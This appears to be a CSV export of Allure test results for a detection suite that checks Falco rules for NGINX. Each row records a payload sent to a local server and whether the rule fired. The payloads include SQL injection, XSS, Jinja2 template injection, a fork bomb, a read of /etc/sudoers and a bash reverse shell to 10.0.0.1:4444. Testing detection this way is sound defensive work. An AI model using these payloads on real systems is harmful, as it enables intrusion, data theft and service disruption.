"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ADV_083` |
| **Name** | Hex Encoded OR Injection |
| **Category** | SQLI |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `0x4f52%201=1`
- **Encoded**: `0x4f52%201%3D1`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 03:40:53.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_083-1769917253132-u71yg8 pattern_id=SQLI_ADV_083 uri=/?q=0x4f52%201%3D1 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_083-1769917253132-u71yg8 pattern_id=SQLI_ADV_083 uri=/?q=0x4f52%201%3D1 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:53.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_083-1769917253132-u71yg8 pattern_id=SQLI_ADV_083 uri=/?q=0x4f52%201%3D1 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[009_SQLI_ADV_083]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_008` |
| **Name** | First table name character discovery |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1)='u' --`
- **Encoded**: `'%20AND%20(SELECT%20SUBSTR(table_name%2C1%2C1)%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()%20LIMIT%201)%3D'u'%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~38000ms
- **Timestamp**: 03:40:49.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_008-1769917249123-hyo1b pattern_id=SQLI_BLIND_008 uri=/?q='%20AND%20(SELECT%20SUBSTR(table_name%2C1%2C1)%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()%20LIMIT%201)%3D'u'%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_008-1769917249123-hyo1b pattern_id=SQLI_BLIND_008 uri=/?q='%20AND%20(SELECT%20SUBSTR(table_name%2C1%2C1)%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()%20LIMIT%201)%3D'u'%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:49.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_008-1769917249123-hyo1b pattern_id=SQLI_BLIND_008 uri=/?q='%20AND%20(SELECT%20SUBSTR(table_name%2C1%2C1)%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase()%20LIMIT%201)%3D'u'%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[029_SQLI_BLIND_008]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_016` |
| **Name** | MySQL BENCHMARK with large iterations |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `BENCHMARK(10000000,MD5('a'))`
- **Encoded**: `BENCHMARK(10000000%2CMD5('a'))`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~66000ms
- **Timestamp**: 03:40:21.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_016-1769917221567-9bbwbw pattern_id=SQLI_TIME_016 uri=/?q=BENCHMARK(10000000%2CMD5('a')) client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_016-1769917221567-9bbwbw pattern_id=SQLI_TIME_016 uri=/?q=BENCHMARK(10000000%2CMD5('a')) client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:21.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_016-1769917221567-9bbwbw pattern_id=SQLI_TIME_016 uri=/?q=BENCHMARK(10000000%2CMD5('a')) client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[111_SQLI_TIME_016]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ADV_082` |
| **Name** | MySQL Comment Bypass with SELECT |
| **Category** | SQLI |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `/*!SELECT*/user,password`
- **Encoded**: `%2F%2A%21SELECT%2A%2Fuser%2Cpassword`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~35000ms
- **Timestamp**: 03:40:52.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ADV_082-1769917252630-vrh5ht pattern_id=SQLI_ADV_082 uri=/?q=%2F%2A%21SELECT%2A%2Fuser%2Cpassword client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ADV_082-1769917252630-vrh5ht pattern_id=SQLI_ADV_082 uri=/?q=%2F%2A%21SELECT%2A%2Fuser%2Cpassword client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:52.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ADV_082-1769917252630-vrh5ht pattern_id=SQLI_ADV_082 uri=/?q=%2F%2A%21SELECT%2A%2Fuser%2Cpassword client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[008_SQLI_ADV_082]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ABS_009` |
| **Name** | Sudoers file access |
| **Category** | PATH |
| **Subcategory** | absolute |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/etc/sudoers`
- **Encoded**: `%2Fetc%2Fsudoers`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 03:40:53.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_009-1769917253112-11q7yi pattern_id=PATH_ABS_009 uri=/?q=%2Fetc%2Fsudoers client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_009-1769917253112-11q7yi pattern_id=PATH_ABS_009 uri=/?q=%2Fetc%2Fsudoers client=127.0.0.1

**Falco Log Entry**:
```
03:40:53.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_009-1769917253112-11q7yi pattern_id=PATH_ABS_009 uri=/?q=%2Fetc%2Fsudoers client=127.0.0.1
```","2","test_e2e_with_logs[214_PATH_ABS_009]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSTI_JINJA_002` |
| **Name** | Jinja2 config disclosure injection |
| **Category** | SSTI |
| **Subcategory** | jinja2 |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `{{config.items()}}`
- **Encoded**: `%7B%7Bconfig.items%28%29%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~30000ms
- **Timestamp**: 03:40:57.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `Template injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Template injection test_id=SSTI_JINJA_002-1769917257545-lgcm6j pattern_id=SSTI_JINJA_002 uri=/?q=%7B%7Bconfig.items%28%29%7D%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Template injection test_id=SSTI_JINJA_002-1769917257545-lgcm6j pattern_id=SSTI_JINJA_002 uri=/?q=%7B%7Bconfig.items%28%29%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
03:40:57.000000000: Critical [NGINX Emerging Threat] Template injection test_id=SSTI_JINJA_002-1769917257545-lgcm6j pattern_id=SSTI_JINJA_002 uri=/?q=%7B%7Bconfig.items%28%29%7D%7D client=127.0.0.1
```","1","test_e2e_with_logs[424_SSTI_JINJA_002]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_PROC_001` |
| **Name** | Fork bomb attempt |
| **Category** | CMDINJ |
| **Subcategory** | process_spawning |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `:(){ :|:& };:`
- **Encoded**: `%3A()%7B%20%3A%7C%3A%26%20%7D%3B%3A`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 03:40:53.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_PROC_001-1769917253101-ozjbce pattern_id=CMD_PROC_001 uri=/?q=%3A()%7B%20%3A%7C%3A%26%20%7D%3B%3A client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_PROC_001-1769917253101-ozjbce pattern_id=CMD_PROC_001 uri=/?q=%3A()%7B%20%3A%7C%3A%26%20%7D%3B%3A client=127.0.0.1

**Falco Log Entry**:
```
03:40:53.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_PROC_001-1769917253101-ozjbce pattern_id=CMD_PROC_001 uri=/?q=%3A()%7B%20%3A%7C%3A%26%20%7D%3B%3A client=127.0.0.1
```","1","test_e2e_with_logs[356_CMD_PROC_001]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_004` |
| **Name** | innerHTML DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `innerHTML='<img src=x onerror=alert(""DOM"")>'`
- **Encoded**: `innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(%22DOM%22)%3E'`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~58000ms
- **Timestamp**: 03:40:29.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_004-1769917229573-2g8ekc pattern_id=XSS_DOM_004 uri=/?q=innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(%22DOM%22)%3E' client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_004-1769917229573-2g8ekc pattern_id=XSS_DOM_004 uri=/?q=innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(%22DOM%22)%3E' client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:29.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_004-1769917229573-2g8ekc pattern_id=XSS_DOM_004 uri=/?q=innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(%22DOM%22)%3E' client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[148_XSS_DOM_004]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_REVSH_001` |
| **Name** | Bash reverse shell |
| **Category** | CMDINJ |
| **Subcategory** | reverse_shell |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`
- **Encoded**: `bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~40000ms
- **Timestamp**: 03:40:47.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_001-1769917247088-vjnsob pattern_id=CMD_REVSH_001 uri=/?q=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_001-1769917247088-vjnsob pattern_id=CMD_REVSH_001 uri=/?q=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261 client=127.0.0.1

**Falco Log Entry**:
```
03:40:47.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_001-1769917247088-vjnsob pattern_id=CMD_REVSH_001 uri=/?q=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261 client=127.0.0.1
```","2","test_e2e_with_logs[359_CMD_REVSH_001]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ERROR_010` |
| **Name** | MULTIPOINT geometry error injection |
| **Category** | SQLI |
| **Subcategory** | error_based |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `' AND MULTIPOINT((SELECT * FROM(SELECT name_const(version(),1),name_const(version(),1))x)) --`
- **Encoded**: `%27%20AND%20MULTIPOINT%28%28SELECT%20%2A%20FROM%28SELECT%20name_const%28version%28%29%2C1%29%2Cname_const%28version%28%29%2C1%29%29x%29%29%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~49000ms
- **Timestamp**: 03:40:38.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Error-based SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_010-1769917238601-wfggi pattern_id=SQLI_ERROR_010 uri=/?q=%27%20AND%20MULTIPOINT%28%28SELECT%20%2A%20FROM%28SELECT%20name_const%28version%28%29%2C1%29%2Cname_const%28version%28%29%2C1%29%29x%29%29%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_010-1769917238601-wfggi pattern_id=SQLI_ERROR_010 uri=/?q=%27%20AND%20MULTIPOINT%28%28SELECT%20%2A%20FROM%28SELECT%20name_const%28version%28%29%2C1%29%2Cname_const%28version%28%29%2C1%29%29x%29%29%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:38.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_010-1769917238601-wfggi pattern_id=SQLI_ERROR_010 uri=/?q=%27%20AND%20MULTIPOINT%28%28SELECT%20%2A%20FROM%28SELECT%20name_const%28version%28%29%2C1%29%2Cname_const%28version%28%29%2C1%29%29x%29%29%20-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[071_SQLI_ERROR_010]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_014` |
| **Name** | javascript: protocol in href |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<a href=""javascript:alert(1)"">click</a>`
- **Encoded**: `%3Ca%20href%3D%22javascript%3Aalert(1)%22%3Eclick%3C%2Fa%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~64000ms
- **Timestamp**: 03:40:23.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_014-1769917223558-tgypdm pattern_id=XSS_REFL_014 uri=/?q=%3Ca%20href%3D%22javascript%3Aalert(1)%22%3Eclick%3C%2Fa%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_014-1769917223558-tgypdm pattern_id=XSS_REFL_014 uri=/?q=%3Ca%20href%3D%22javascript%3Aalert(1)%22%3Eclick%3C%2Fa%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:23.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_014-1769917223558-tgypdm pattern_id=XSS_REFL_014 uri=/?q=%3Ca%20href%3D%22javascript%3Aalert(1)%22%3Eclick%3C%2Fa%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[199_XSS_REFL_014]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_014` |
| **Name** | Sleep with inline comment |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `SLEEP(/*5*/5)`
- **Encoded**: `SLEEP%28/%2A5%2A/5%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~69000ms
- **Timestamp**: 03:40:18.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_014-1769917218561-00ry2 pattern_id=SQLI_TIME_014 uri=/?q=SLEEP%28/%2A5%2A/5%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_014-1769917218561-00ry2 pattern_id=SQLI_TIME_014 uri=/?q=SLEEP%28/%2A5%2A/5%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:18.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_014-1769917218561-00ry2 pattern_id=SQLI_TIME_014 uri=/?q=SLEEP%28/%2A5%2A/5%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[109_SQLI_TIME_014]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_004` |
| **Name** | Background execution with ps |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `& ps aux`
- **Encoded**: `%26%20ps%20aux`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~59000ms
- **Timestamp**: 03:40:28.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_004-1769917228546-x6g5m5 pattern_id=CMD_BASIC_004 uri=/?q=%26%20ps%20aux client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_004-1769917228546-x6g5m5 pattern_id=CMD_BASIC_004 uri=/?q=%26%20ps%20aux client=127.0.0.1

**Falco Log Entry**:
```
03:40:28.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_004-1769917228546-x6g5m5 pattern_id=CMD_BASIC_004 uri=/?q=%26%20ps%20aux client=127.0.0.1
```","2","test_e2e_with_logs[303_CMD_BASIC_004]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_REDIS_002` |
| **Name** | Redis configuration disclosure |
| **Category** | NOSQL |
| **Subcategory** | redis |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `CONFIG GET *`
- **Encoded**: `CONFIG%20GET%20%2A`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~19000ms
- **Timestamp**: 03:41:08.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Redis command injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Redis command injection test_id=EMRG_REDIS_002-1769917268057-mcsh1r pattern_id=EMRG_REDIS_002 uri=/?q=CONFIG%20GET%20%2A client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Redis command injection test_id=EMRG_REDIS_002-1769917268057-mcsh1r pattern_id=EMRG_REDIS_002 uri=/?q=CONFIG%20GET%20%2A client=127.0.0.1

**Falco Log Entry**:
```
03:41:08.000000000: Critical [NGINX Emerging Threat] Redis command injection test_id=EMRG_REDIS_002-1769917268057-mcsh1r pattern_id=EMRG_REDIS_002 uri=/?q=CONFIG%20GET%20%2A client=127.0.0.1
```","2","test_e2e_with_logs[449_EMRG_REDIS_002]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_MUT_007` |
| **Name** | Marquee tag XSS |
| **Category** | XSS |
| **Subcategory** | mutation |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<marquee onstart=alert('XSS')>`
- **Encoded**: `%3Cmarquee%20onstart%3Dalert('XSS')%3E`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","1","test_e2e_with_logs[172_XSS_MUT_007]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_007` |
| **Name** | Username existence check |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT LOCATE('admin',(SELECT GROUP_CONCAT(username) FROM users)))>0 --`
- **Encoded**: `'%20AND%20(SELECT%20LOCATE('admin'%2C(SELECT%20GROUP_CONCAT(username)%20FROM%20users)))%3E0%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~39000ms
- **Timestamp**: 03:40:48.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Error-based SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SQLI_BLIND_007-1769917248622-ampzdk pattern_id=SQLI_BLIND_007 uri=/?q='%20AND%20(SELECT%20LOCATE('admin'%2C(SELECT%20GROUP_CONCAT(username)%20FROM%20users)))%3E0%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_BLIND_007-1769917248622-ampzdk pattern_id=SQLI_BLIND_007 uri=/?q='%20AND%20(SELECT%20LOCATE('admin'%2C(SELECT%20GROUP_CONCAT(username)%20FROM%20users)))%3E0%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
03:40:48.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_BLIND_007-1769917248622-ampzdk pattern_id=SQLI_BLIND_007 uri=/?q='%20AND%20(SELECT%20LOCATE('admin'%2C(SELECT%20GROUP_CONCAT(username)%20FROM%20users)))%3E0%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[028_SQLI_BLIND_007]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
